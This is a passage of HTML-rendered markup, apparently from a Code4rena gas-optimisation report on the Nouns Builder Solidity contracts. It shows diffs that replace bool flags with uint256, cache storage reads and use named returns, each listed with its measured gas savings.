class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    135, 135:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    136, 136:         _beforeTokenTransfer(_from, _to, _tokenId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    137, 137:</span></span></span></code></pre>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/lib/utils/Pausable.sol\">src/lib/utils/Pausable.sol</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"94\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/lib/utils/Pausable.sol b/src/lib/utils/Pausable.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 6057d6b..5d37ad7 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/lib/utils/Pausable.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/lib/utils/Pausable.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -12,7 +12,7 @@ abstract contract Pausable is IPausable, Initializable {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    12,  12:     ///                                                          ///</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    13,  13:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    14,  14:     /// @dev If the contract is paused</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  15     :-    bool internal _paused;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       15:+    uint256 internal _paused;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    16,  16:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    17,  17:     ///                                                          ///</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    18,  18:     ///                           MODIFIERS                      ///</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -20,13 +20,13 @@ abstract contract Pausable is IPausable, Initializable {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    20,  20:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    21,  21:     /// @dev Ensures the contract is paused</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    22,  22:     modifier whenPaused() {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  23     :-        if (!_paused) revert UNPAUSED();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       23:+        if (0==_paused) revert UNPAUSED();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    24,  24:         _;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    25,  25:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    26,  26:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    27,  27:     /// @dev Ensures the contract isn&#39;t paused</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    28,  28:     modifier whenNotPaused() {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  29     :-        if (_paused) revert PAUSED();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       29:+        if (1==_paused) revert PAUSED();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    30,  30:         _;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    31,  31:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    32,  32:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -37,24 +37,24 @@ abstract contract Pausable is IPausable, Initializable {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    37,  37:     /// @dev Sets whether the initial state</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    38,  38:     /// @param _initPause If the contract should pause upon initialization</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    39,  39:     function __Pausable_init(bool _initPause) internal onlyInitializing {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  40     :-        _paused = _initPause;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       40:+        _paused = _initPause ? 1 : 0;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    41,  41:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    42,  42:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    43,  43:     /// @notice If the contract is paused</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    44,  44:     function paused() external view returns (bool) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  45     :-        return _paused;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       45:+        return _paused == 1;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    46,  46:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    47,  47:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    48,  48:     /// @dev Pauses the contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    49,  49:     function _pause() internal virtual whenNotPaused {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  50     :-        _paused = true;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       50:+        _paused = 1;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    51,  51:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    52,  52:         emit Paused(msg.sender);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    53,  53:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    54,  54:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    55,  55:     /// @dev Unpauses the contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    56,  56:     function _unpause() internal virtual whenPaused {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  57     :-        _paused = false;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       57:+        _paused = 0;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    58,  58:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    59,  59:         emit Unpaused(msg.sender);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    60,  60:     }</span></span></span></code></pre>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/manager/Manager.sol\">src/manager/Manager.sol</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/manager/storage/ManagerStorageV1.sol\">src/manager/storage/ManagerStorageV1.sol</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"95\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/manager/Manager.sol b/src/manager/Manager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index d1025ec..5e2a230 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/manager/Manager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/manager/Manager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -178,14 +178,14 @@ contract Manager is IManager, UUPS, Ownable, ManagerStorageV1 {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    178, 178:     /// @param _baseImpl The base implementation address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    179, 179:     /// @param _upgradeImpl The upgrade implementation address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    180, 180:     function isRegisteredUpgrade(address _baseImpl, address _upgradeImpl) external view returns (bool) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 181     :-        return isUpgrade[_baseImpl][_upgradeImpl];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      181:+        return 1==isUpgrade[_baseImpl][_upgradeImpl];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    182, 182:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    183, 183:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    184, 184:     /// @notice Called by the Builder DAO to offer implementation upgrades for created DAOs</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    185, 185:     /// @param _baseImpl The base implementation address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    186, 186:     /// @param _upgradeImpl The upgrade implementation address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    187, 187:     function registerUpgrade(address _baseImpl, address _upgradeImpl) external onlyOwner {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 188     :-        isUpgrade[_baseImpl][_upgradeImpl] = true;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      188:+        isUpgrade[_baseImpl][_upgradeImpl] = 1;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    189, 189:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    190, 190:         emit UpgradeRegistered(_baseImpl, _upgradeImpl);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    191, 191:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/manager/storage/ManagerStorageV1.sol b/src/manager/storage/ManagerStorageV1.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 5d981ef..e566821 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/manager/storage/ManagerStorageV1.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/manager/storage/ManagerStorageV1.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -7,5 +7,5 @@ pragma solidity 0.8.15;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    7,   7: contract ManagerStorageV1 {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    8,   8:     /// @notice If a contract has been registered as an upgrade</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    9,   9:     /// @dev Base impl =&gt; Upgrade impl</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  10     :-    mapping(address =&gt; mapping(address =&gt; bool)) internal isUpgrade;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       10:+    mapping(address =&gt; mapping(address =&gt; uint256)) internal isUpgrade;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    11,  11: }</span></span></span></code></pre>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/metadata/MetadataRenderer.sol\">src/token/metadata/MetadataRenderer.sol</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/metadata/types/MetadataRendererTypesV1.sol\">src/token/metadata/types/MetadataRendererTypesV1.sol</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"96\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/token/metadata/MetadataRenderer.sol b/src/token/metadata/MetadataRenderer.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 7a140ec..7976581 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/token/metadata/MetadataRenderer.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/token/metadata/MetadataRenderer.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -136,7 +136,7 @@ contract MetadataRenderer is IPropertyIPFSMetadataRenderer, UUPS, Ownable, Metad</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    136, 136:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    137, 137:                 // Offset the id if the item is for a new property</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    138, 138:                 // Note: Property ids under the hood are offset by 1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 139     :-                if (_items[i].isNewProperty) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      139:+                if (_items[i].isNewProperty == 1) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    140, 140:                     _propertyId += numStoredProperties;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    141, 141:                 }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    142, 142:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/token/metadata/types/MetadataRendererTypesV1.sol b/src/token/metadata/types/MetadataRendererTypesV1.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index c0890f6..4a3146b 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/token/metadata/types/MetadataRendererTypesV1.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/token/metadata/types/MetadataRendererTypesV1.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -8,7 +8,7 @@ interface MetadataRendererTypesV1 {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    8,   8:     struct ItemParam {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    9,   9:         uint256 propertyId;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    10,  10:         string name;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  11     :-        bool isNewProperty;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       11:+        uint256 isNewProperty;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    12,  12:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    13,  13:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    14,  14:     struct IPFSGroup {</span></span></span></code></pre>\n<h2 id=\"g-05-storage-variable-is-used-when-local-exists-2-instances\" style=\"position:relative;\"><a href=\"#g-05-storage-variable-is-used-when-local-exists-2-instances\" aria-label=\"g 05 storage variable is used when local exists 2 instances permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-05] Storage variable is used when local exists (2 instances)</h2>\n<p>Deployment Gas Saved: <strong>1 400</strong><br>\nMethod Call Gas Saved: <strong>2 602</strong><br>\n<code>forge snapshot --diff</code>: <strong>41 326</strong> Gas Saved</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/auction/Auction.sol\">src/auction/Auction.sol</a></li>\n</ul>\n<p>function: <code>_settleAuction</code>: <code>auction</code> cached in 169 but readed from storage in 172</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"97\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/auction/Auction.sol b/src/auction/Auction.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 794da99..3754f3b 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/auction/Auction.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/auction/Auction.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -169,7 +169,7 @@ contract Auction is IAuction, UUPS, Ownable, ReentrancyGuard, Pausable, AuctionS</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">169, 169:         Auction memory _auction = auction;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">170, 170:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">171, 171:         // Ensure the auction wasn&#39;t already settled</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 172     :-        if (auction.settled) revert AUCTION_SETTLED();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      172:+        if (_auction.settled) revert AUCTION_SETTLED();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">173, 173:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">174, 174:         // Ensure the auction had started</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">175, 175:         if (_auction.startTime == 0) revert AUCTION_NOT_STARTED();</span></span></span></code></pre>\n<ul>\n<li>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol\">src/governance/governor/Governor.sol</a></p>\n<p>function <code>propose</code>: <code>proposalThreshold()</code> cached in 123, but called again in 128</p>\n</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"98\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/governance/governor/Governor.sol b/src/governance/governor/Governor.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 0d963c5..ce1ad1a 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/governance/governor/Governor.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/governance/governor/Governor.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -125,7 +125,7 @@ contract Governor is IGovernor, UUPS, Ownable, EIP712, GovernorStorageV1 {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">125, 125:         // Cannot realistically underflow and `getVotes` would revert</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">126, 126:         unchecked {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">127, 127:             // Ensure the caller&#39;s voting weight is greater than or equal to the threshold</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 128     :-            if (getVotes(msg.sender, block.timestamp - 1) &lt; proposalThreshold()) revert BELOW_PROPOSAL_THRESHOLD();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      128:+            if (getVotes(msg.sender, block.timestamp - 1) &lt; currentProposalThreshold) revert BELOW_PROPOSAL_THRESHOLD();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">129, 129:         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">130, 130:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">131, 131:         // Cache the number of targets</span></span></span></code></pre>\n<h2 id=\"g-06-use-named-returns-where-appropriate-3-instances\" style=\"position:relative;\"><a href=\"#g-06-use-named-returns-where-appropriate-3-instances\" aria-label=\"g 06 use named returns where appropriate 3 instances permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-06] Use named returns where appropriate (3 instances)</h2>\n<p>Deployment Gas Saved: <strong>2 000</strong><br>\nMethod Call Gas Saved: <strong>174</strong><br>\n<code>forge snapshot --diff</code>: <strong>621</strong> Gas Saved</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol\">src/governance/governor/Governor.sol</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"99\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/governance/governor/Governor.sol b/src/governance/governor/Governor.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 0d963c5..200a72a 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/governance/governor/Governor.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/governance/governor/Governor.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -118,7 +118,7 @@ contract Governor is IGovernor, UUPS, Ownable, EIP712, GovernorStorageV1 {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">118, 118:         uint256[] memory _values,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">119, 119:         bytes[] memory _calldatas,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">120, 120:         string memory _description</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 121     :-    ) external returns (bytes32) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      121:+    ) external returns (bytes32 proposalId) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">122, 122:         // Get the current proposal threshold</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">123, 123:         uint256 currentProposalThreshold = proposalThreshold();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">124, 124:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -142,7 +142,7 @@ contract Governor is IGovernor, UUPS, Ownable, EIP712, GovernorStorageV1 {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">142, 142:         bytes32 descriptionHash = keccak256(bytes(_description));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">143, 143:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">144, 144:         // Compute the proposal id</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 145     :-        bytes32 proposalId = hashProposal(_targets, _values, _calldatas, descriptionHash);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      145:+        proposalId = hashProposal(_targets, _values, _calldatas, descriptionHash);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">146, 146:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">147, 147:         // Get the pointer to store the proposal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">148, 148:         Proposal storage proposal = proposals[proposalId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -170,8 +170,6 @@ contract Governor is IGovernor, UUPS, Ownable, EIP712, GovernorStorageV1 {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">170, 170:         proposal.timeCreated = uint32(block.timestamp);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">171, 171:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">172, 172:         emit ProposalCreated(proposalId, _targets, _values, _calldatas, _description, descriptionHash, proposal);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 173     :-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- 174     :-        return proposalId;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">175, 173:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">176, 174:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">177, 175:     ///                                                          ///</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -250,7 +248,7 @@ contract Governor is IGovernor, UUPS, Ownable, EIP712, GovernorStorageV1 {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">250, 248:         address _voter,</span></span></span>\n<span class=\"grvsc-line\"><span 